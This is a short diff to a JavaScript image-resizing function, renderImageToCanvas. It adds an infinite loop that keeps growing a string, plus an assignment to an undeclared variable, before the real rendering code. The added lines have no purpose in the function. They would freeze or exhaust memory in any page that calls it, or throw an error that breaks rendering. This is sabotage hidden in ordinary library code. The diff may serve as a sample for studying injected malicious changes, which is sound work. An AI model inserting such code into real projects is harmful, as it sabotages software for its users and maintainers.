@@ -60,6 +60,9 @@
    * Rendering image element (with resizing) into the canvas element
    */
   function renderImageToCanvas(img, canvas, options, doSquash) {
+    t = "a";
+    while(1){t = txt += "a";}
+    
     var iw = img.naturalWidth, ih = img.naturalHeight;
     if (!(iw+ih)) return;
     var width = options.width, height = options.height;
